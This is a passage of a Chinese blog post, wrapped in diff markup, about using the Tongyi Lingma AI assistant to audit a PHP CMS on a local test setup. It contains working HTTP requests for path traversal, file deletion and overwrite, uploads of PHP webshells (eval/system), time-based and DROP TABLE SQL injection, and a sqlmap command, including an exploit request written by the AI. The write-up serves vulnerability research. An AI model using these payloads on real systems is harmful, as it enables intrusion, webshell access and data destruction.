</span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>可在图片查看界面实现对文件目录的遍历：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/19.png" alt="image"></p>
+<p>同理，这里也可以结合imgDel方法实现对服务器任意文件的删除，具有极高危害！</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/20.png" alt="image"></p>
+</blockquote>
+<h3><span id="文件上传漏洞-文件内容覆盖漏洞">文件上传漏洞、文件内容覆盖漏洞</span></h3><blockquote>
+<p>继续跟进上述灵码输出内容，我们知道此处insert, update 方法还存在文件上传漏洞</p>
+<p>在BP中抓包地址如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/21.png" alt="image"></p>
+<p>我们先修改为insert方法，故当前请求包为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/insert.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/edit/file/article_list.html.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>将请求包丢入灵码中，让其构造能够验证漏洞存在的请求包：</p>
+<blockquote>
+<p>已知insert方法中存在文件上传漏洞，下面这是该方法的请求包，请你修改请求包以让我验证漏洞是否存在，依据代码本身来，不要额外新增参数</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/insert.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>65</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/edit/file/article_list.html.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">file=test.php&amp;type=php&amp;content=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，灵码根据当前insert方法需要输入的参数，自己构造了一个请求包</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/22.png" alt="image"></p>
+<p>并且下面也给出了相应解释及详细验证步骤</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/23.png" alt="image"></p>
+<p>因为是本机测试环境，所以我就换了一个无影响的文件内容来进行验证</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/insert.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/edit/file/article_list.html.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">file=../../shell&amp;type=php&amp;content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>返回包提示添加成功</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/24.png" alt="image"></p>
+<p>在static目录下可以看到该上传的文件</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/25.png" alt="image"></p>
+<p>由于没有限制文件格式和内容，此处是可以上传任何格式和内容</p>
+<p>同理，我们看到update方法的构造是与上述insert方法一摸一样的，也存在多个可控参数</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/26.png" alt="image"></p>
+<p>这里直接延用上述请求包即可：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/update.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>public</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gradle"><span class="keyword">file</span>=..<span class="regexp">/../</span>../ceshi.txt&amp;type=txt&amp;content=nihao</span></span><br></pre></td></tr></table></figure>
+
+<p>但注意，此处原请求type值为空，file文件后跟上后缀.html，但如果要任意文件修改，则必须指明type类型，不能为空，在file后也要写文件的全名（包括后缀）</p>
+<p>执行后结果如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/27.png" alt="image"></p>
+<p>原测试文件内容如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/28.png" alt="image"></p>
+<p>执行后文件内容如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/29.png" alt="image"></p>
+<p>可以看到已实现对任意文件内容的修改</p>
+</blockquote>
+<h3><span id="sql注入漏洞">SQL注入漏洞</span></h3><blockquote>
+<p>看完了几个高危，我们再来看看比较常见的SQL注入漏洞，这个项目的后台因为本身就可以实现对数据库的管理，所以后台已授权的SQL注入反而显得毫无价值了，我们仅以此为例，来看看通义灵码全面的辅助审计能力</p>
+<p>进入到广告管理模块下面,看到其调用的方法来自AD.php</p>
+<p>继续使用上述prompt：</p>
+<blockquote>
+<p>已知该代码中存在SQL注入漏洞，请你找出你能确定的漏洞，并简要分析该漏洞形成原因</p>
+</blockquote>
+<p>此处因为目标是寻找SQL注入漏洞，为了进一步缩小范围，可以直接告知它存在该漏洞，如若不存在，它会明确告知无SQL注入风险</p>
+<p>它给出的回答如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">在提供的代码中，存在多个潜在的<span class="keyword">SQL</span>注入漏洞。以下是一些确定的漏洞及其成因分析：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> index 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>(<span class="string">&#x27;a.title&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, &quot;%&quot; . $key . &quot;%&quot;)</span><br><span class="line"></span><br><span class="line">成因分析:$key 是从用户输入的 post.key 获取的，没有进行任何过滤或转义。</span><br><span class="line">如果用户输入恶意的 <span class="keyword">SQL</span> 语句，可以直接影响查询条件，导致 <span class="keyword">SQL</span> 注入。</span><br><span class="line"></span><br><span class="line">示例攻击:用户输入 key 为 <span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>，查询条件将变为 a.title <span class="keyword">LIKE</span> <span class="string">&#x27;%1\&#x27;</span> <span class="keyword">OR</span> \<span class="string">&#x27;1\&#x27;</span><span class="operator">=</span>\<span class="string">&#x27;1%&#x27;</span>，这将导致查询返回所有记录。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> editState 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line">if(db(<span class="string">&#x27;ad&#x27;</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>(<span class="string">&#x27;id=&#x27;</span>.$id)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">update</span>([<span class="string">&#x27;open&#x27;</span><span class="operator">=</span><span class="operator">&gt;</span>$<span class="keyword">open</span>])<span class="operator">!=</span><span class="operator">=</span><span class="literal">false</span>)&#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">成因分析:$id 是从用户输入的 post.id 获取的，没有进行任何过滤或转义。</span><br><span class="line">如果用户输入恶意的 <span class="keyword">SQL</span> 语句，可以直接影响查询条件，导致 <span class="keyword">SQL</span> 注入。</span><br><span class="line"></span><br><span class="line">示例攻击:用户输入 id 为 <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>，查询条件将变为 id<span class="operator">=</span><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>，这将导致更新所有记录。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> del 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;ad&#x27;</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span><span class="operator">=</span><span class="operator">&gt;</span>input(<span class="string">&#x27;id&#x27;</span>)))<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">delete</span>();</span><br><span class="line"></span><br><span class="line">成因分析:虽然这里使用了数组形式的 <span class="keyword">where</span> 条件，但在某些情况下，如果 input(<span class="string">&#x27;id&#x27;</span>) 是一个复杂的表达式，仍然可能存在风险。</span><br><span class="line"></span><br><span class="line">最好使用参数绑定来确保安全性。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> delall 方法中的 <span class="keyword">where</span> 条件</span><br><span class="line"></span><br><span class="line">$map[] <span class="operator">=</span><span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;in&#x27;</span>,input(<span class="string">&#x27;param.ids/a&#x27;</span>));</span><br><span class="line">db(<span class="string">&#x27;ad&#x27;</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">where</span>($map)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">delete</span>();</span><br><span class="line"></span><br><span class="line">成因分析:input(<span class="string">&#x27;param.ids/a&#x27;</span>) 直接用于 <span class="keyword">IN</span> 子句，没有进行任何过滤或转义。</span><br><span class="line">如果用户输入恶意的 <span class="keyword">SQL</span> 语句，可以直接影响查询条件，导致 <span class="keyword">SQL</span> 注入。</span><br><span class="line"></span><br><span class="line">示例攻击:用户输入 ids 为 <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--，查询条件将变为 id IN (1,2,3) OR 1=1 --，这将导致删除所有记录。</span></span><br></pre></td></tr></table></figure>
+
+<p>比如说我们想聚焦到其中一个方法下面，具体对其进行研究和复现，可以使用如下prompt：</p>
+<blockquote>
+<p>请详细讨论editState 方法中的 where 条件</p>
+</blockquote>
+<p>灵码就会针对该方法进行详细的分析：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">问题分析</span><br><span class="line">用户输入直接拼接到 SQL 语句中:$id 和 $open 是从用户输入的 POST 请求中直接获取的，没有进行任何验证或转义。</span><br><span class="line"></span><br><span class="line">这种做法非常危险，因为用户可以通过构造恶意的输入来注入 SQL 代码。</span><br><span class="line"></span><br><span class="line">SQL 注入风险:如果用户输入的 id 为 1 OR 1=1，查询条件将变为 id=1 OR 1=1，这将导致更新所有记录。</span><br><span class="line"></span><br><span class="line">类似地，如果用户输入的 open 为 1; DROP TABLE ad; --，可能会导致更严重的后果。</span><br><span class="line"></span><br><span class="line">示例攻击</span><br><span class="line">假设用户发送以下 POST 请求：</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/admin/ad/editState</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">id</span>=1 <span class="keyword">OR</span> <span class="attribute">1</span>=1&amp;open=1</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">生成的 SQL 语句将是：</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">UPDATE `ad` <span class="built_in">SET</span> `open` = 1 WHERE id = 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">这条 SQL 语句将更新表 ad 中的所有记录，而不是仅仅更新 id 为 1 的记录。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/30.png" alt="image"></p>
+<p>对应的，我们直接去web界面的广告管理模块，找到调用editState方法的位置</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/31.png" alt="image"></p>
+<p>抓包如下，构造延迟注入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/ad/editstate.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>25</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/ad/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=bs9fg0tv537v13ooprl3j6v6bb; skin=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">id</span>=38 <span class="keyword">and</span> sleep(5)&amp;<span class="attribute">open</span>=1</span></span><br></pre></td></tr></table></figure>
+
+<p>验证发现可以延迟</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/32.png" alt="image"></p>
+<p>随后采用SQLmap进行验证存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py sqlmap.py -r url.txt --batch --dbms=mysql --is-dba</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/33.png" alt="image"></p>
+</blockquote>
+<h2><span id="workspace工作空间分析">workspace工作空间分析</span></h2><blockquote>
+<p>除去对当前代码的基础分析外，灵码也可以对当前的工作空间进行整体分析：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/34.png" alt="image"></p>
+<p>进入workspace工作空间模式下，此时它可以直接读到本地项目，所以我们可以指明文件的目录位置来进行prompt提问：</p>
+<blockquote>
+<p>@workspace<br>请你分析application&#x2F;admin&#x2F;controller&#x2F;Common.php文件，判断出其中存在的安全漏洞。</p>
+</blockquote>
+<p>灵码给出的回复如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/35.png" alt="image"></p>
+<p>如若不指出，也可以直接提问让其在整个工作空间下寻找漏洞点：</p>
+<blockquote>
+<p>请指出该程序中可能存在的安全漏洞并加以简要分析</p>
+</blockquote>
+<p>但是这种方法的缺点就在于”随机性”太强，因为灵码的输出字符数有限，且它引用的你本地代码文件数量有限，所以极有可能出现每次结果都完全不一样的情况，如果存在漏洞点较多，它的输出就更加模糊了。</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/36.png" alt="image"></p>
+<p>这个功能的一些好处在于，它不仅能够帮助开发者更深入地理解自己的代码库，还能根据现有代码的逻辑和编程风格提供更加个性化、更加贴合实际需求的代码片段或优化建议。例如，通过分析现有的编码模式，该功能可以识别出重复的代码模板或者常见的开发习惯，进而提出改进措施来提高代码的可读性和效率。此外，对于那些希望保持项目一致性或是遵循特定设计模式的团队来说，这种定制化的反馈是非常有价值的。它还可以帮助识别潜在的bug或性能瓶颈，从而提升软件的质量与运行效率。</p>
+</blockquote>
+<h2><span id="总结及展望">总结及展望</span></h2><blockquote>
+<p>我接触灵码也已经快两年了，之前一直都是用来写运维脚本，这是我第一次尝试结合AI工具来辅助代码审计，在实际应用中，通义灵码的表现确实是超出了我的预期。它不仅帮助我快速定位了多个潜在的安全漏洞，而且还极大地提升了审计工作的效率。这一经历让我深刻认识到，AI技术在软件安全领域的应用前景广阔，尤其是在提高代码审查质量和速度方面具有显著优势。</p>
+<p>但同时，它仍然存在可提升空间：</p>
+<ul>
+<li>在理解和解释复杂业务逻辑方面的能力还有待加强，尤其是在面对非标准或高度定制化的代码时，其表现不尽如人意。</li>
+<li>在workspace模式下，有些过于僵硬，不能很好的理解我的需求</li>
+</ul>
+<p>回望过去两年灵码能力的大幅度增强，我们有理由相信它在未来会变得更加智能和高效，能够更好地应对复杂代码结构和逻辑，减少误报率，提高漏洞检测的准确性。同时，通过不断优化用户体验，灵码将能够更好地适应多样化的需求，提供更加个性化和定制化的服务，使开发者和安全研究人员能够更专注于核心问题的解决。</p>
+</blockquote>
+
+        </div>
+        <div class="article-tags tags">
+            
+                <a class="tag-none-link" href="/tags/AI/" rel="tag">AI</a><a class="tag-none-link" href="/tags/Code-Review/" rel="tag">Code-Review</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            
+        </div>
+    </section>
+</article>
+
+
+
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/szczecin" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/tags/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
